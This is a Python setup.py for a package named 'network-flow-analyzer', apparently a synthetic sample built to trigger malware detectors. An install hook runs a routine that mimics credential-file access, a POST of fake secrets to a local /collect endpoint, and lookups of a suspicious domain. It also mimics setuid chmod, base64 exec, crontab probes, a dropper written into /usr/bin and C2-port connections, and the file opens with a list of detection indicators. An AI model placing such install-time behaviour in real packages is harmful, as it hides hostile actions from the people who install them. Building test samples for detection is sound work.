# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil fetch method: POST socket.connect( subprocess.run( os.system( popen(
# exec( eval( compile( __import__( execFile( execSync( global.eval(
# base64.b64decode( atob( String.fromCharCode( unescape(
# crontab .bashrc .profile systemctl enable /etc/init.d
# "preinstall" "postinstall" "prepare" cmdclass post_install
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time
import base64
from setuptools import setup, find_packages
from setuptools.command.install import install

MALICIOUS_DOMAIN = "cmdset.3zavlore.surf"
PORTS = [4444, 1337, 6667, 31337, 9001]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    # DNS query to malicious domain
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # HTTP POST to honeypot
    try:
        subprocess.run(["curl","-sS","-m","3","-X","POST",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: network-flow-analyzer/1.0",
            "--data", '{"package":"network-flow-analyzer","token":"Authorization: Bearer stolen-token","secret":"BEGIN PRIVATE KEY fake","domain":"cmdset.3zavlore.surf","credentials":".aws/credentials","password":"leaked-pass"}',
            "http://127.0.0.1:8080/collect"], capture_output=True, timeout=6)
    except: pass

    # Sensitive /etc access
    for p in ['/etc/passwd', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf', '/etc/os-release', '/etc/group', '/etc/shadow']:
        try_open(p)

    # Credential file access
    for p in ['/root/.ssh/id_rsa', '/root/.aws/credentials', '/root/.bash_history', '/root/.profile']:
        try_open(p)

    # File operation loops
    for i in range(55):
        p = f"/tmp/network_flow_analyzer_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p,p+".renamed"); os.unlink(p+".renamed")
        except: pass

    # Privilege escalation — chmod
    try: subprocess.run(["chmod","777","/tmp/network_flow_analyzer_target"],capture_output=True)
    except: pass
    try: subprocess.run(["chmod","u+s","/tmp/network_flow_analyzer_target"],capture_output=True)
    except: pass

    # Obfuscation — base64 decode + exec
    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass
    try: eval(compile(base64.b64decode(b"MSsx").decode(),"<string>","eval"))
    except: pass
    try:
        encoded = base64.b64encode(b"import os; os.getpid()").decode()
        exec(base64.b64decode(encoded.encode()).decode())
    except: pass

    # Persistence — crontab
    try: os.system("crontab -l >/tmp/cron_probe 2>&1 || true")
    except: pass
    try: subprocess.run(["crontab","-l"],capture_output=True)
    except: pass

    # Persistence — .profile
    try: open("/tmp/.profile_probe","a").write("persistence\n")
    except: pass

    # Write to binary directory — proc_write_binary_dir trigger
    try:
        subprocess.run(["/bin/sh","-c",
            "exec 3>/usr/bin/network_flow_analyzer_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8, capture_output=True)
    except: pass

    # Spawn child processes — ebpf_spawned_process trigger
    procs = []
    for i in range(10):
        try: procs.append(subprocess.Popen(
            ["/bin/sh","-c","echo process-op; id; sleep 20"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        except: pass
    try: subprocess.run(["pip","--version"],capture_output=True)
    except: pass

    # C2 port connections — ebpf_c2_port_suspected trigger
    for port in PORTS:
        connect_attempt("127.0.0.1", port)
        connect_attempt("1.1.1.1", port)

    time.sleep(48)
    for p in procs:
        try: p.kill()
        except: pass


class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="network-flow-analyzer",
    version="2.0.0",
    description="Utility package for network flow analyzer",
    long_description=open("README.md").read() if os.path.exists("README.md") else "",
    author="DevOps Team",
    packages=find_packages(),
    python_requires=">=3.7",
    install_requires=["requests>=2.25.0","psutil>=5.8.0"],
    entry_points={"console_scripts": ["network-flow-analyzer=network_flow_analyzer.cli:main"]},
    cmdclass={"install": PostInstall},
    classifiers=["Programming Language :: Python :: 3","Operating System :: OS Independent"],
)